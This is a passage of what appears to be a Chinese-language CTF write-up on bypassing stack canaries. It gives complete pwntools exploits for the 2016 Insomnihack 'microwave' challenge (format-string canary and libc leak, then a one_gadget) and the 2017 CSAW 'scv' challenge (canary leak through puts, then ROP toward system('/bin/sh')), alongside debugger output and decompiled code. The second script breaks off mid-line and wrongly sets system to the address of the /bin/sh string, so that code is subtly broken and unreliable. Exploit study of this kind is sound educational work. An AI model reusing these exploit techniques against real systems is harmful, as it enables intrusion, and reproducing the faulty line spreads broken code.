class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGINT</span><br><span class="line">0x00007ffff7b04260 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84</span><br><span class="line">84../sysdeps/unix/syscall-template.S: No such file or directory.</span><br><span class="line">assassinq&gt;&gt; vmmap </span><br><span class="line">Start              End                PermName</span><br><span class="line">0x0000555555554000 0x0000555555557000 r-xp/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave</span><br><span class="line">0x0000555555757000 0x0000555555758000 r--p/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave</span><br><span class="line">0x0000555555758000 0x0000555555759000 rw-p/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave</span><br><span class="line">0x0000555555759000 0x000055555577a000 rw-p[heap]</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 ---p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 r--p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p/lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 rw-pmapped</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7fd7000 0x00007ffff7fda000 rw-pmapped</span><br><span class="line">0x00007ffff7ff7000 0x00007ffff7ffa000 r--p[vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp[vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 r--p/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p/lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">0x00007ffff7ffe000 0x00007ffff7fff000 rw-pmapped</span><br><span class="line">0x00007ffffffdd000 0x00007ffffffff000 rw-p[stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp[vsyscall]</span><br></pre></td></tr></table></figure><p>最后放上exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line">local = 0</span><br><span class="line">if local:</span><br><span class="line">p = process(&apos;./microwave&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">libc_base_offset = 0xf72c0</span><br><span class="line">one_gadget_offset = 0x45216</span><br><span class="line">else:</span><br><span class="line">p = remote(&apos;127.0.0.1&apos;, 1337)</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line">libc_base_offset = 0xeb870</span><br><span class="line">one_gadget_offset = 0x464d8</span><br><span class="line">elf = ELF(&apos;./microwave&apos;)</span><br><span class="line">log.success(&apos;libc_base_offset = &apos; + hex(libc_base_offset))</span><br><span class="line">log.success(&apos;one_gadget_offset = &apos; + hex(one_gadget_offset))</span><br><span class="line"></span><br><span class="line">def connect(username, password):</span><br><span class="line">p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;1&apos;)</span><br><span class="line">p.sendlineafter(&apos;username:&apos;, username)</span><br><span class="line">p.sendlineafter(&apos;password:&apos;, password)</span><br><span class="line"></span><br><span class="line">def edit(content):</span><br><span class="line">p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;2&apos;)</span><br><span class="line">p.sendlineafter(&apos;#&gt;&apos;, content)</span><br><span class="line"></span><br><span class="line">def tweet():</span><br><span class="line">p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;3&apos;)</span><br><span class="line"></span><br><span class="line">def quit():</span><br><span class="line">p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;q&apos;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(p)</span><br><span class="line">password = &apos;n07_7h3_fl46&apos;</span><br><span class="line">connect(&apos;%p.&apos; * 8, password)</span><br><span class="line">p.recvuntil(&apos;Checking&apos;)</span><br><span class="line">leak_data = p.recvline().strip().split(&apos;.&apos;)[:-1]</span><br><span class="line">print leak_data</span><br><span class="line">canary = int(leak_data[5][2:], 16)</span><br><span class="line">log.success(&apos;canary = &apos; + hex(canary))</span><br><span class="line">leak_libc = int(leak_data[1][2:], 16)</span><br><span class="line">log.success(&apos;leak_libc = &apos; + hex(leak_libc))</span><br><span class="line">libc_base = leak_libc - libc_base_offset</span><br><span class="line">log.success(&apos;libc_base = &apos; + hex(libc_base))</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line">log.success(&apos;one_gadget = &apos; + hex(one_gadget))</span><br><span class="line">payload = flat([</span><br><span class="line">&apos;A&apos; * 1032, </span><br><span class="line">canary, </span><br><span class="line">&apos;B&apos; * 8, </span><br><span class="line">one_gadget</span><br><span class="line">])</span><br><span class="line">edit(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="2017-CSAW-Quals-scv"><a href="#2017-CSAW-Quals-scv" class="headerlink" title="2017-CSAW-Quals-scv"></a>2017-CSAW-Quals-scv</h3><p>开了<code>Canary</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/assassinq/pwn/ctf-wiki/canary/2017-CSAW-Quals-csv/scv&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>就只有一个main函数，由于是c++程序，看起来有点混乱：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  __int64 v15; <span class="comment">// rax</span></span><br><span class="line">  __int64 v16; <span class="comment">// rax</span></span><br><span class="line">  __int64 v17; <span class="comment">// rax</span></span><br><span class="line">  __int64 v18; <span class="comment">// rax</span></span><br><span class="line">  __int64 v19; <span class="comment">// rax</span></span><br><span class="line">  __int64 v20; <span class="comment">// rax</span></span><br><span class="line">  __int64 v21; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> choice; <span class="comment">// [rsp+4h] [rbp-BCh]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [rsp+8h] [rbp-B8h]</span></span><br><span class="line">  <span class="keyword">int</span> v25; <span class="comment">// [rsp+Ch] [rbp-B4h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-B0h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v27; <span class="comment">// [rsp+B8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v27 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  choice = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">1</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v24 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]SCV GOOD TO GO,SIR...."</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    v5 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    v6 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"1.FEED SCV...."</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    v7 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"2.REVIEW THE FOOD...."</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    v8 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"3.MINE MINERALS...."</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v8, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    v9 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"&gt;&gt;"</span>);</span><br><span class="line">    <span class="built_in">std</span>::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;choice);</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:                                   <span class="comment">// show</span></span><br><span class="line">        v15 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v15, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v16 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]REVIEW THE FOOD..........."</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v16, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v17 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v17, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v18 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]PLEASE TREAT HIM WELL....."</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v18, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v19 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v19, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">puts</span>(&amp;buf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:                                   <span class="comment">// exit</span></span><br><span class="line">        v24 = <span class="number">0</span>;</span><br><span class="line">        v20 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]BYE ~ TIME TO MINE MIENRALS..."</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v20, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:                                   <span class="comment">// edit</span></span><br><span class="line">        v10 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v10, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v11 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]SCV IS ALWAYS HUNGRY....."</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v11, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v12 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v12, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v13 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]GIVE HIM SOME FOOD......."</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v13, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        v14 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"-------------------------"</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v14, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"&gt;&gt;"</span>);</span><br><span class="line">        v25 = read(<span class="number">0</span>, &amp;buf, <span class="number">0xF8</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        v21 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"[*]DO NOT HURT MY SCV...."</span>);</span><br><span class="line">        <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v21, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>case 1</code>存在<code>buffer overflow</code>，通过调试观察到输入与<code>Canary</code>之间的偏移为168。如果要泄漏<code>Canary</code>的话，就必须让所有的<code>\x00</code>被覆盖掉，包括<code>Canary</code>低位的<code>\x00</code>，以让<code>puts</code>认为buf连同<code>Canary</code>为一个字符串。libc也可以用同样的方式泄漏，最后放上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./scv'</span>, env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc-2.23.so'</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./scv'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">str_bin_sh_offset = next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line">log.success(<span class="string">'system_offset = '</span> + hex(system_offset))</span><br><span class="line">log.success(<span class="string">'str_bin_sh_offset = '</span> + hex(str_bin_sh_offset))</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400ea3</span></span><br><span class="line">log.success(<span class="string">'pop_rdi_ret = '</span> + hex(pop_rdi_ret))</span><br><span class="line">one_gadget_offset = <span class="number">0x45216</span></span><br><span class="line">log.success(<span class="string">'one_gadget_offset = '</span> + hex(one_gadget_offset))</span><br><span class="line">libc_base_offset = <span class="number">0x3a20a</span></span><br><span class="line">log.success(<span class="string">'libc_base_offset = '</span> + hex(libc_base_offset))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;'</span>, <span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;'</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;'</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="string">'A'</span> * (<span class="number">40</span> - <span class="number">1</span>) + <span class="string">':'</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'leak_addr = '</span> + hex(leak_addr))</span><br><span class="line">libc_base = leak_addr - libc_base_offset</span><br><span class="line">log.success(<span class="string">'libc_base = '</span> + hex(libc_base))</span><br><span class="line">system = libc_base + str_bin_sh_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line">log.success(<span class="string">'system = '</span> + hex(system))</span><br><span 